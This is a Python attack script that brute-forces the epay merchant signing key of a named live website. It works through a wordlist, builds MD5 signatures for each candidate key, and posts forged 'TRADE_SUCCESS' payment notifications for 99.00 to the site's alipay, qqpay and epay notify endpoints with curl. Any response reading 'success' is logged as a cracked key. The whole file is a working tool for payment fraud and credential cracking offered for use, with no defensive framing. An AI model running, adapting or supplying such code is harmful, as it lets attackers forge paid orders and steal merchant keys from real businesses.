#!/usr/bin/env python3
"""qq1.lol epay merchant key brute — adapted from fffzz epay slow"""
import hashlib
import json
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol/"
OUT = Path(sys.argv[2]) if len(sys.argv) > 2 else Path("/data/automation/results/qq1.lol")
DICT = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/data/wordlists/epay-keys.txt")
OUT.mkdir(parents=True, exist_ok=True)
JAR = str(OUT / ".cookies_epay")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HITS = OUT / "epay_hits.jsonl"
PROGRESS = OUT / "epay_slow_progress.json"
LOG = OUT / "epay_slow.log"
DELAY = float(sys.argv[3]) if len(sys.argv) > 3 else 1.0
TRADE_NO = sys.argv[4] if len(sys.argv) > 4 else "20260720145603146"


def log(msg):
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def epay_sign(params, key):
    items = sorted((k, v) for k, v in params.items() if k not in ("sign", "sign_type") and v != "")
    return hashlib.md5(("&".join(f"{k}={v}" for k, v in items) + key).encode()).hexdigest()


def curl_post(url, post):
    cmd = [
        "curl", "-sk", "--max-time", "15", "-b", JAR, "-c", JAR, "-A", UA,
        "-H", f"Referer: {BASE}", "-H", "Content-Type: application/x-www-form-urlencoded",
        "-X", "POST", "-d", post, url,
    ]
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=18).stdout or ""
    except Exception:
        return ""


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {"line": 0}


def save_progress(line):
    PROGRESS.write_text(json.dumps({"line": line, "ts": datetime.now().isoformat()}))


def main():
    start = load_progress()["line"]
    log(f"=== qq1 epay slow start line={start} trade={TRADE_NO} dict={DICT} ===")
    params = {
        "pid": "1",
        "trade_no": TRADE_NO,
        "out_trade_no": TRADE_NO,
        "type": "alipay",
        "name": "test",
        "money": "99.00",
        "trade_status": "TRADE_SUCCESS",
    }
    endpoints = ["other/epay_notify.php", "other/alipay_notify.php", "other/qqpay_notify.php"]
    with open(DICT) as f:
        for i, line in enumerate(f):
            if i < start:
                continue
            key = line.strip()
            if not key:
                continue
            sign = epay_sign(params, key)
            data = dict(params)
            data["sign"] = sign
            data["sign_type"] = "MD5"
            post = "&".join(f"{k}={v}" for k, v in data.items())
            for ep in endpoints:
                resp = curl_post(f"{BASE}{ep}", post)
                low = resp.lower()
                if "success" in low or resp.strip() in ("OK", "ok"):
                    hit = {"key": key, "ep": ep, "resp": resp, "line": i}
                    log(f"*** HIT {hit}")
                    with open(HITS, "a") as hf:
                        hf.write(json.dumps(hit) + "\n")
                    return
                if resp and resp.strip() not in ("error", "fail", "签名失败", ""):
                    if "fail" not in low or "签名" not in resp:
                        log(f"  unusual line={i} key={key[:20]} ep={ep} -> {resp[:80]}")
            if i % 500 == 0:
                save_progress(i)
                log(f"  progress line={i}")
            time.sleep(DELAY)
    log("=== done no hit ===")


if __name__ == "__main__":
    main()
